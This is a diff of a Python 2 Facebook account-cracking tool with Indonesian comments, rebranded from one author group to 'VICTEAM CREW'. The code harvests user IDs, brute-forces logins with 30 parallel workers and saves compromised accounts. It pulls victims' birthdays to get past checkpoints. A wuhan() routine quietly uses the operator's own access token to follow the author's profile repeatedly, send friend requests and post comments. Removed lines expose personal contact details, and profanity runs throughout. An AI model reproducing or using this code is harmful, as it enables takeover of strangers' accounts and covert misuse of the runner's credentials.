@@ -1,11 +1,11 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by Shinxzy
-# my facebook ( https://www.facebook.com/100069713181960 )
+# code by VICTEAM CREW
+# my facebook ( https://web.facebook.com/profile.php?id=100041821297585 )
 
 #      (C) Copyright 407 Authentic Exploit
 #      Rebuild Copyright Can't make u real programmer:)
-#      Coded By Shinxzy.
+#      Coded By VicTeam.
 
 import os
 try:
@@ -59,7 +59,7 @@ N = '\x1b[0m'    # WARNA MATI
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
-#  M Zainul Umam tukang cilok.  #
+#  VicTeam.  #
 #------------------------------->
 
 ok = []
@@ -89,21 +89,19 @@ def tod():
         time.sleep(1)
 
 # LO KONTOL
-logo = '''\033[0;92m programmer by:SHINZY \033[0m
-\033[0;91m ____  _     _             _____ \033[0m
-\033[0;91m/ ___|| |__ (_)_ __ __  __|__  /   _ \033[0m
-\033[0;93m\___ \| '_ \| | '_' \\ \/ /  / / | | | \033[0m
-\033[0;93m ___) | | | | | | | |>  <  / /| |_| | \033[0m
-\033[0;92m|____/|_| |_|_|_| |_/_/\_\/____\__, | \033[0m
-\033[0;92m                               |___/ \033[0m \033[0;92mPREMIUM AKTIF \033[0m
+logo = '''\033[0;92m (C) Copyright by:VICTEAM \033[0m
+\033[0;91m  _      _  _    ____                                         \033[0m
+\033[0;91m | |    / /| |  / ____\  ______    _____     __      _      _ \033[0m
+\033[0;93m | |   / / | | | /      /   |   \ |         /  \    | \    / |\033[0m
+\033[0;93m | |  / /  | | | |          |     |____    /____\   |  \  /  |\033[0m
+\033[0;92m | |_/ /   | | | \____      |     |       /      \  |   \/   |\033[0m
+\033[0;92m |____/    |_|  \_____/     |     |_____ /        \ |        |\033[0m \033[0;92mFROM LOCAL TO GLOBAL \033[0m
 
- \033[0;91m 🖕😤👉WELCOME TO \033[0;92mSHINXZY\033[0m \033[0;91m CRACK TOOLS👈😤🖕\033[0m 　
+ \033[0;91m 💦💦WELCOME TO \033[0;92mVICTEAM\033[0m \033[0;91m CRACK TOOLS💦💦\033[0m 　
 　
- \033[0;93m [👉] Created by M.ZAINUL UMAM \033[0m
- \033[0;92m [👉] Email :zyshin41@gmail.com \033[0m
- \033[0;92m [👉] Bisnis:hig_rnh76@shinzy.com \033[0m
- \033[0;92m [👉] WA    :+6285740559154 \033[0m  \033[0;96mV4.0 \033[0m
-   \033[0;91mFACEBOOK CRACK SUPPORTED BY\033[0m \033[0;93mCPA/AFFILIATE SERAH TEAM\033[0m'''
+ \033[0;93m [👉] Created by VICTEAM CREW \033[0m
+ \033[0;92m [👉] AWAS EPSILON \033[0m
+   \033[0;91mFROM VICTEAM TO\033[0m \033[0;93mCRESPOW\033[0m'''
 
 lo_ngentod = '1714009362122228'
 # crack selesai
@@ -132,9 +130,9 @@ def yayanxd():
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
         print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
         print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N);time.sleep(2)
-        open('.memek.txt', 'w').write(kontol)
+        open('.vic.txt', 'w').write(kontol)
         raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100069713181960')
+        os.system('xdg-open https://web.facebook.com/profile.php?id=100041821297585')
         moch_yayan()
     except KeyError:
         print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
@@ -143,13 +141,13 @@ def yayanxd():
 def moch_yayan():
     os.system('clear')
     try:
-    	kontol = open('.memek.txt', 'r').read()
+    	kontol = open('.vic.txt', 'r').read()
     except IOError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .vic.txt');yayanxd()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
     except KeyError:
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .vic.txt');yayanxd()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
@@ -199,8 +197,8 @@ def moch_yayan():
             hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
             jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
-            for memek in total:
-            	kontol = memek.replace("\n","")
+            for vic in total:
+            	kontol = vic.replace("\n","")
                 titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                 print("%s%s"%(titid,N));time.sleep(0.03)
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
@@ -215,7 +213,7 @@ def moch_yayan():
     elif pepek in['0','00']:
         print '\n'
         tod()
-        time.sleep(1);os.system('rm -rf .memek.txt')
+        time.sleep(1);os.system('rm -rf .vic.txt')
         jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
     else:
         print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
@@ -224,15 +222,15 @@ def moch_yayan():
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041821297585/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
@@ -325,7 +323,7 @@ def followers(kontol):
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ah)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan dolanmu kurang adoh.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump id, gobloke lak isek di terusno.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 # dump id dari followers hehe
@@ -525,13 +523,13 @@ def cek_ingfo(kontol):
 def info_tools():
     os.system('clear')
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
-    print '\n %s[%s>%s] Donasi   : 081237346234(Dana).'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Author   : Muhammad Zainul Umam.'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Github   : https://github.com/Shinzy24'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Facebook : https://www.facebook.com/100069713181960'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/100069713181960'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Instagram: https://www.instagram.com/shin_ze04'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Blogspot : https://shinhackzy.com'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Donasi   : .'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Author   : VICTEAM CREW.'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Github   : https://github.com/VicteamsAdmin'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Facebook : https://web.facebook.com/profile.php?id=100041821297585'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Fanspage : https://web.facebook.com/profile.php?id=100041821297585'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Instagram: ILANG'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Blogspot : DURONG NGGAWE'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
     raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
@@ -618,7 +616,7 @@ class __crack__:
                         elif cin == '2':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s!%s] mode pesawat setiap 1000 / 1k proses\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -631,7 +629,7 @@ class __crack__:
                         elif cin == '3':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s!%s] mode pesawat setiap 1000 / 1k proses\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -689,7 +687,7 @@ class __crack__:
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
-                    kontol = open('.memek.txt').read()
+                    kontol = open('.vic.txt').read()
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
@@ -740,7 +738,7 @@ class __crack__:
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
-                    kontol = open('.memek.txt').read()
+                    kontol = open('.vic.txt').read()
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
@@ -791,7 +789,7 @@ class __crack__:
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
-                    kontol = open('.memek.txt').read()
+                    kontol = open('.vic.txt').read()
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
